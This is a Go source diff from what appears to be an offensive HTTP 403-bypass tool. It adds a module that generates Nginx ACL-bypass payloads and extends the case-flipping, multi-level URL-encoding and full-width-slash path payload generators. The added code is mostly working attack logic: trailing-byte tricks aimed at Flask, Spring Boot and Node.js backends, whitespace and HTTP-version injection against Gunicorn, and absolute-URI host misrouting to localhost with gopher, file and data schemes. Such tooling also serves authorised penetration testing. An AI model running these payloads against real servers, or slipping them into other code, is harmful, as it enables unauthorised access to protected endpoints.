@@ -23,6 +23,7 @@ var BypassModulesRegistry = []string{
 	"http_methods",
 	"case_substitution",
 	"char_encode",
+	"nginx_bypasses",
 	"http_headers_scheme",
 	"http_headers_ip",
 	"http_headers_port",
@@ -69,6 +70,8 @@ func (pg *PayloadGenerator) Generate() []BypassPayload {
 		return pg.GenerateCaseSubstitutionPayloads(pg.targetURL, pg.bypassModule)
 	case "http_methods":
 		return pg.GenerateHTTPMethodsPayloads(pg.targetURL, pg.bypassModule)
+	case "nginx_bypasses":
+		return pg.GenerateNginxACLsBypassPayloads(pg.targetURL, pg.bypassModule)
 	case "char_encode":
 		return pg.GenerateCharEncodePayloads(pg.targetURL, pg.bypassModule)
 	case "http_headers_scheme":
@@ -510,7 +513,36 @@ func (pg *PayloadGenerator) GenerateCaseSubstitutionPayloads(targetURL string, b
 	// map[rawURI]struct{} - we only need unique RawURIs
 	uniquePaths := make(map[string]struct{})
 
-	// Find all letter positions
+	// Base job template
+	baseJob := BypassPayload{
+		OriginalURL:  targetURL,
+		Method:       "GET",
+		Scheme:       parsedURL.Scheme,
+		Host:         parsedURL.Host,
+		BypassModule: bypassModule,
+	}
+
+	// 1. CAIDO TECHNIQUE: Last letter uppercase
+	if len(basePath) > 0 {
+		lastCharIndex := len(basePath) - 1
+		lastChar := basePath[lastCharIndex]
+
+		if isLetter(byte(lastChar)) && lastChar >= 'a' && lastChar <= 'z' {
+			// Create version with just the last letter uppercase
+			lastLetterUppercase := basePath[:lastCharIndex] + strings.ToUpper(string(lastChar))
+			uniquePaths[lastLetterUppercase+query] = struct{}{}
+		}
+	}
+
+	// 2. First line (method) uppercase
+	// Create a variant with uppercase method
+	methodUpperJob := baseJob
+	methodUpperJob.Method = strings.ToUpper(methodUpperJob.Method) // Already uppercase for GET but handles other methods
+	methodUpperJob.RawURI = basePath + query
+	methodUpperJob.PayloadToken = GeneratePayloadToken(methodUpperJob)
+	allJobs = append(allJobs, methodUpperJob)
+
+	// 3. Find and invert case for all letter positions
 	for i, char := range basePath {
 		if isLetter(byte(char)) {
 			// Create case-inverted version
@@ -527,19 +559,20 @@ func (pg *PayloadGenerator) GenerateCaseSubstitutionPayloads(targetURL string, b
 		}
 	}
 
-	// Convert to PayloadJobs
+	// Convert unique paths to PayloadJobs
 	for rawURI := range uniquePaths {
-		job := BypassPayload{
-			OriginalURL:  targetURL,
-			Method:       "GET",
-			Scheme:       parsedURL.Scheme,
-			Host:         parsedURL.Host,
-			RawURI:       rawURI,
-			BypassModule: bypassModule,
-		}
-
+		job := baseJob
+		job.RawURI = rawURI
 		job.PayloadToken = GeneratePayloadToken(job)
+		allJobs = append(allJobs, job)
+	}
 
+	// 4. Full uppercase path (this is more comprehensive than Caido's approach)
+	fullUpperPath := strings.ToUpper(basePath)
+	if fullUpperPath != basePath { // Only if there's something to change
+		job := baseJob
+		job.RawURI = fullUpperPath + query
+		job.PayloadToken = GeneratePayloadToken(job)
 		allJobs = append(allJobs, job)
 	}
 
@@ -564,7 +597,7 @@ func (pg *PayloadGenerator) GenerateCharEncodePayloads(targetURL string, bypassM
 		query = "?" + parsedURL.Query
 	}
 
-	// Create three separate maps for different encoding levels
+	// Create separate maps for different encoding levels
 	singlePaths := make(map[string]struct{})
 	doublePaths := make(map[string]struct{})
 	triplePaths := make(map[string]struct{})
@@ -578,7 +611,88 @@ func (pg *PayloadGenerator) GenerateCharEncodePayloads(targetURL string, bypassM
 		BypassModule: bypassModule,
 	}
 
-	// Find all letter positions
+	// 1. First process the last character of the path
+	if len(basePath) > 0 {
+		lastCharIndex := len(basePath) - 1
+		lastChar := basePath[lastCharIndex]
+
+		// Only encode if it's a letter
+		if isLetter(lastChar) {
+			// Single URL encoding for last character
+			encoded := fmt.Sprintf("%%%02x", lastChar)
+			singleEncoded := basePath[:lastCharIndex] + encoded
+			singlePaths[singleEncoded+query] = struct{}{}
+
+			// Double URL encoding for last character
+			doubleEncoded := basePath[:lastCharIndex] + "%25" + encoded[1:]
+			doublePaths[doubleEncoded+query] = struct{}{}
+
+			// Triple URL encoding for last character
+			tripleEncoded := basePath[:lastCharIndex] + "%2525" + encoded[1:]
+			triplePaths[tripleEncoded+query] = struct{}{}
+		}
+	}
+
+	// 2. Process the first character of the path
+	if len(basePath) > 0 && basePath != "/" {
+		firstCharIndex := 0
+		// Skip leading slash if present
+		if basePath[0] == '/' && len(basePath) > 1 {
+			firstCharIndex = 1
+		}
+
+		firstChar := basePath[firstCharIndex]
+
+		// Only encode if it's a letter
+		if isLetter(firstChar) {
+			// Single URL encoding for first character
+			encoded := fmt.Sprintf("%%%02x", firstChar)
+			singleEncoded := basePath[:firstCharIndex] + encoded + basePath[firstCharIndex+1:]
+			singlePaths[singleEncoded+query] = struct{}{}
+
+			// Double URL encoding for first character
+			doubleEncoded := basePath[:firstCharIndex] + "%25" + encoded[1:] + basePath[firstCharIndex+1:]
+			doublePaths[doubleEncoded+query] = struct{}{}
+
+			// Triple URL encoding for first character
+			tripleEncoded := basePath[:firstCharIndex] + "%2525" + encoded[1:] + basePath[firstCharIndex+1:]
+			triplePaths[tripleEncoded+query] = struct{}{}
+		}
+	}
+
+	// 3. Process the last path segment
+	if len(basePath) > 0 {
+		segments := strings.Split(basePath, "/")
+		if len(segments) > 1 {
+			lastSegment := segments[len(segments)-1]
+
+			// Skip empty segments
+			if lastSegment != "" {
+				// Process last segment
+				for i, char := range lastSegment {
+					if isLetter(byte(char)) {
+						// Build the path prefix (everything before the last segment)
+						prefix := strings.Join(segments[:len(segments)-1], "/") + "/"
+
+						// Single URL encoding
+						encoded := fmt.Sprintf("%%%02x", char)
+						singleEncoded := prefix + lastSegment[:i] + encoded + lastSegment[i+1:]
+						singlePaths[singleEncoded+query] = struct{}{}
+
+						// Double URL encoding
+						doubleEncoded := prefix + lastSegment[:i] + "%25" + encoded[1:] + lastSegment[i+1:]
+						doublePaths[doubleEncoded+query] = struct{}{}
+
+						// Triple URL encoding
+						tripleEncoded := prefix + lastSegment[:i] + "%2525" + encoded[1:] + lastSegment[i+1:]
+						triplePaths[tripleEncoded+query] = struct{}{}
+					}
+				}
+			}
+		}
+	}
+
+	// 4. Find all letter positions in the entire path
 	for i, char := range basePath {
 		if isLetter(byte(char)) {
 			// Single URL encoding
@@ -614,6 +728,288 @@ func (pg *PayloadGenerator) GenerateCharEncodePayloads(targetURL string, bypassM
 
 	totalJobs := len(singlePaths) + len(doublePaths) + len(triplePaths)
 	GB403Logger.Debug().BypassModule(bypassModule).Msgf("Generated %d payloads for %s\n", totalJobs, targetURL)
+	return allJobs
+}
+
+func (pg *PayloadGenerator) GenerateNginxACLsBypassPayloads(targetURL string, bypassModule string) []BypassPayload {
+	var allJobs []BypassPayload
+
+	parsedURL, err := rawurlparser.RawURLParse(targetURL)
+	if err != nil {
+		GB403Logger.Error().Msgf("Failed to parse URL")
+		return allJobs
+	}
+
+	basePath := parsedURL.Path
+
+	// Extract query string if it exists
+	query := ""
+	if parsedURL.Query != "" {
+		query = "?" + parsedURL.Query
+	}
+
+	// Base job template
+	baseJob := BypassPayload{
+		OriginalURL:  targetURL,
+		Method:       "GET",
+		Scheme:       parsedURL.Scheme,
+		Host:         parsedURL.Host,
+		BypassModule: bypassModule,
+	}
+
+	// Define bypass character sets for different Nginx scenarios
+	nginxFlaskChars := []string{"\x85"}                      // Next line character
+	nginxSpringBootChars := []string{"%09", ";"}             // URL-encoded tab and semicolon
+	nginxNodejsTrimChars := []string{"\xA0", "\x09", "\x0C"} // Non-breaking space, tab, form feed
+
+	// Group all characters together
+	allNginxBypassChars := []string{}
+	allNginxBypassChars = append(allNginxBypassChars, nginxFlaskChars...)
+	allNginxBypassChars = append(allNginxBypassChars, nginxSpringBootChars...)
+	allNginxBypassChars = append(allNginxBypassChars, nginxNodejsTrimChars...)
+
+	// Generate payloads by appending characters to path
+	for _, char := range allNginxBypassChars {
+		job := baseJob
+		job.RawURI = basePath + char + query
+		job.PayloadToken = GeneratePayloadToken(job)
+		allJobs = append(allJobs, job)
+	}
+
+	// Also try after a trailing slash if the path doesn't already end with one
+	if !strings.HasSuffix(basePath, "/") {
+		for _, char := range allNginxBypassChars {
+			job := baseJob
+			job.RawURI = basePath + "/" + char + query
+			job.PayloadToken = GeneratePayloadToken(job)
+			allJobs = append(allJobs, job)
+		}
+	}
+
+	// NEW TECHNIQUE: Nginx+Gunicorn whitespace parsing discrepancy exploit
+	// Whitespace in path causes Gunicorn to stop parsing at the whitespace
+	whitespaceVariants := []struct {
+		raw    string // Raw character
+		urlEnc string // URL-encoded version
+		hexEsc string // Hex escape sequence
+		desc   string // Description for logging
+	}{
+		{"\t", "%09", "\\x09", "tab"},                       // Tab
+		{" ", "%20", "\\x20", "space"},                      // Space
+		{"\u00A0", "%C2%A0", "\\xA0", "non-breaking-space"}, // Non-breaking space
+		{"\v", "%0B", "\\x0B", "vertical-tab"},              // Vertical tab
+		{"\f", "%0C", "\\x0C", "form-feed"},                 // Form feed
+	}
+
+	// HTTP version-like strings that Gunicorn might misinterpret
+	httpVersions := []string{
+		"HTTP/1.1",
+		"HTTP/1.0",
+		"HTTP/2.0",
+		"HTTP/0.9",
+	}
+
+	// Generate standard whitespace+HTTP version payloads
+	for _, whitespace := range whitespaceVariants {
+		for _, httpVersion := range httpVersions {
+			// 1. Raw whitespace character
+			job := baseJob
+			job.RawURI = basePath + whitespace.raw + httpVersion + query
+			job.PayloadToken = GeneratePayloadToken(job)
+			allJobs = append(allJobs, job)
+
+			// 2. URL-encoded whitespace character
+			job = baseJob
+			job.RawURI = basePath + whitespace.urlEnc + httpVersion + query
+			job.PayloadToken = GeneratePayloadToken(job)
+			allJobs = append(allJobs, job)
+
+			// 3. Hex-escaped sequence (for path components that might be decoded differently)
+			job = baseJob
+			job.RawURI = basePath + whitespace.hexEsc + httpVersion + query
+			job.PayloadToken = GeneratePayloadToken(job)
+			allJobs = append(allJobs, job)
+
+			// Try at different positions in complex paths
+			if strings.Count(basePath, "/") > 1 {
+				segments := strings.Split(strings.TrimPrefix(basePath, "/"), "/")
+
+				for i := 0; i < len(segments); i++ {
+					prefix := "/" + strings.Join(segments[:i+1], "/")
+					suffix := ""
+					if i+1 < len(segments) {
+						suffix = "/" + strings.Join(segments[i+1:], "/")
+					}
+
+					// Raw whitespace character at path segment
+					job := baseJob
+					job.RawURI = prefix + whitespace.raw + httpVersion + suffix + query
+					job.PayloadToken = GeneratePayloadToken(job)
+					allJobs = append(allJobs, job)
+
+					// URL-encoded whitespace character at path segment
+					job = baseJob
+					job.RawURI = prefix + whitespace.urlEnc + httpVersion + suffix + query
+					job.PayloadToken = GeneratePayloadToken(job)
+					allJobs = append(allJobs, job)
+
+					// Hex-escaped whitespace character at path segment
+					job = baseJob
+					job.RawURI = prefix + whitespace.hexEsc + httpVersion + suffix + query
+					job.PayloadToken = GeneratePayloadToken(job)
+					allJobs = append(allJobs, job)
+				}
+			}
+		}
+	}
+
+	// NEW TECHNIQUE: Absolute-URI in path and with whitespace combination
+	// Some servers prioritize Absolute-URI over Host header when parsing requests
+
+	// Generate alternative schemes to test in Absolute-URI
+	schemes := []string{
+		"http://",
+		"https://",
+		"gopher://", // parser behavior
+		"data:",     // Protocol handlers that might bypass restrictions
+		"file://",
+	}
+
+	// Alternative hosts to test in Absolute-URI (targeting host misrouting)
+	alternativeHosts := []string{
+		"localhost",
+		"127.0.0.1",
+		"localhost:" + parsedURL.Port, // With port if original URL had one
+		"127.0.0.1:" + parsedURL.Port, // With port if original URL had one
+	}
+
+	// If the parsed URL has no port but uses standard ports, add those variants
+	if parsedURL.Port == "" {
+		alternativeHosts = append(alternativeHosts, "localhost:80", "localhost:443")
+		alternativeHosts = append(alternativeHosts, "127.0.0.1:80", "127.0.0.1:443")
+	}
+
+	// 1. Simple absolute URI in path
+	for _, scheme := range schemes {
+		// Original host variant
+		job := baseJob
+		absoluteURI := scheme + parsedURL.Host + basePath
+		job.RawURI = absoluteURI + query
+		job.PayloadToken = GeneratePayloadToken(job)
+		allJobs = append(allJobs, job)
+
+		// NEW TECHNIQUE: Host misrouting using localhost instead of original host
+		// This exploits the behavior seen in the diagram where Nginx routes to localhost
+		// while HAProxy still sees the target.com Host header
+		for _, altHost := range alternativeHosts {
+			job := baseJob
+			absoluteURI := scheme + altHost + basePath
+			job.RawURI = absoluteURI + query
+			job.PayloadToken = GeneratePayloadToken(job)
+			allJobs = append(allJobs, job)
+
+			// Also try keeping the Host header explicitly set to original host
+			// This is exactly the scenario in the image: localhost in URI, target.com in Host header
+			jobWithHostHeader := baseJob
+			jobWithHostHeader.RawURI = absoluteURI + query
+			jobWithHostHeader.Headers = append(jobWithHostHeader.Headers, Headers{
+				Header: "Host",
+				Value:  parsedURL.Host,
+			})
+			jobWithHostHeader.PayloadToken = GeneratePayloadToken(jobWithHostHeader)
+			allJobs = append(allJobs, jobWithHostHeader)
+		}
+
+		// Also try with subdomain variations (for potential domain parser bugs)
+		if !strings.Contains(parsedURL.Host, "localhost") && strings.Count(parsedURL.Host, ".") > 0 {
+			parts := strings.Split(parsedURL.Host, ".")
+			if len(parts) >= 3 {
+				// Try with parent domain
+				parentDomain := strings.Join(parts[1:], ".")
+				job := baseJob
+				job.RawURI = scheme + parentDomain + basePath + query
+				job.PayloadToken = GeneratePayloadToken(job)
+				allJobs = append(allJobs, job)
+			}
+		}
+	}
+
+	// 2. Combine Absolute-URI with whitespace technique for most powerful bypass
+	for _, whitespace := range whitespaceVariants {
+		for _, scheme := range schemes {
+			// A. Whitespace + Absolute-URI with original host
+			job := baseJob
+			job.RawURI = basePath + whitespace.raw + scheme + parsedURL.Host + basePath + query
+			job.PayloadToken = GeneratePayloadToken(job)
+			allJobs = append(allJobs, job)
+
+			// Whitespace + Absolute-URI with localhost (primary misrouting attack vector)
+			for _, altHost := range alternativeHosts {
+				job := baseJob
+				job.RawURI = basePath + whitespace.raw + scheme + altHost + basePath + query
+				job.PayloadToken = GeneratePayloadToken(job)
+				allJobs = append(allJobs, job)
+
+				// URL-encoded whitespace version
+				job = baseJob
+				job.RawURI = basePath + whitespace.urlEnc + scheme + altHost + basePath + query
+				job.PayloadToken = GeneratePayloadToken(job)
+				allJobs = append(allJobs, job)
+
+				// With explicit Host header (exactly like in the diagram)
+				job = baseJob
+				job.RawURI = basePath + whitespace.raw + scheme + altHost + basePath + query
+				job.Headers = append(job.Headers, Headers{
+					Header: "Host",
+					Value:  parsedURL.Host,
+				})
+				job.PayloadToken = GeneratePayloadToken(job)
+				allJobs = append(allJobs, job)
+			}
+
+			// URL-encoded whitespace version (original host)
+			job = baseJob
+			job.RawURI = basePath + whitespace.urlEnc + scheme + parsedURL.Host + basePath + query
+			job.PayloadToken = GeneratePayloadToken(job)
+			allJobs = append(allJobs, job)
+
+			// B. Whitespace + HTTP + whitespace + Absolute-URI (complex case)
+			for _, httpVersion := range httpVersions {
+				// Original host
+				job := baseJob
+				job.RawURI = basePath + whitespace.raw + httpVersion + whitespace.raw + scheme + parsedURL.Host + basePath + query
+				job.PayloadToken = GeneratePayloadToken(job)
+				allJobs = append(allJobs, job)
+
+				// Localhost variants with HTTP version for complex cases
+				for _, altHost := range alternativeHosts {
+					// Raw version
+					job := baseJob
+					job.RawURI = basePath + whitespace.raw + httpVersion + whitespace.raw + scheme + altHost + basePath + query
+					job.PayloadToken = GeneratePayloadToken(job)
+					allJobs = append(allJobs, job)
+
+					// With explicit Host header
+					job = baseJob
+					job.RawURI = basePath + whitespace.raw + httpVersion + whitespace.raw + scheme + altHost + basePath + query
+					job.Headers = append(job.Headers, Headers{
+						Header: "Host",
+						Value:  parsedURL.Host,
+					})
+					job.PayloadToken = GeneratePayloadToken(job)
+					allJobs = append(allJobs, job)
+				}
+
+				// URL-encoded version (original host)
+				job = baseJob
+				job.RawURI = basePath + whitespace.urlEnc + httpVersion + whitespace.urlEnc + scheme + parsedURL.Host + basePath + query
+				job.PayloadToken = GeneratePayloadToken(job)
+				allJobs = append(allJobs, job)
+			}
+		}
+	}
+
+	GB403Logger.Debug().BypassModule(bypassModule).Msgf("Generated %d Nginx bypass payloads for %s\n", len(allJobs), targetURL)
 	return allJobs
 }
 
@@ -1226,6 +1622,64 @@ func (pg *PayloadGenerator) GenerateUnicodePathNormalizationsPayloads(targetURL 
 				addPathVariants(unicodePath.String())
 				addPathVariants(encodedPath.String())
 			}
+		}
+	}
+
+	// 3. Special case: Add full-width slash before the last segment
+	segments := strings.Split(path, "/")
+	if len(segments) > 1 {
+		lastSegment := segments[len(segments)-1]
+		if lastSegment != "" {
+			// Create a new path with the full-width slash before the last segment
+			newSegments := make([]string, len(segments))
+			copy(newSegments, segments)
+
+			// Add the full-width slash before the last segment
+			// U+FF0F (／) = %ef%bc%8f
+			newSegments[len(newSegments)-1] = "%ef%bc%8f" + lastSegment
+
+			// Join the path back together
+			fullWidthSlashPath := strings.Join(newSegments, "/")
+			addPathVariants(fullWidthSlashPath)
+
+			// Also try with the raw Unicode character version
+			newSegments[len(newSegments)-1] = "／" + lastSegment
+			unicodeFullWidthPath := strings.Join(newSegments, "/")
+			addPathVariants(unicodeFullWidthPath)
+		}
+	}
+
+	// 4. Enhanced technique: Add full-width slash after each slash in the path
+	if strings.Contains(path, "/") {
+		// For each slash position, create variants with fullwidth slash added after it
+		var lastPos int
+		var enhancedPathEncoded, enhancedPathUnicode strings.Builder
+
+		for i, char := range path {
+			if char == '/' {
+				// Add everything up to and including the slash
+				enhancedPathEncoded.WriteString(path[lastPos : i+1])
+				enhancedPathUnicode.WriteString(path[lastPos : i+1])
+
+				// Add fullwidth slash after the regular slash
+				enhancedPathEncoded.WriteString("%ef%bc%8f") // URL-encoded version
+				enhancedPathUnicode.WriteString("／")         // Unicode version
+
+				// Create and add the variant up to this point to catch all possible positions
+				enhancedPathSoFarEncoded := enhancedPathEncoded.String() + path[i+1:]
+				enhancedPathSoFarUnicode := enhancedPathUnicode.String() + path[i+1:]
+
+				addPathVariants(enhancedPathSoFarEncoded)
+				addPathVariants(enhancedPathSoFarUnicode)
+
+				lastPos = i + 1
+			}
+		}
+
+		// Include remainder of the path if we ended on a non-slash
+		if lastPos < len(path) {
+			enhancedPathEncoded.WriteString(path[lastPos:])
+			enhancedPathUnicode.WriteString(path[lastPos:])
 		}
 	}
 
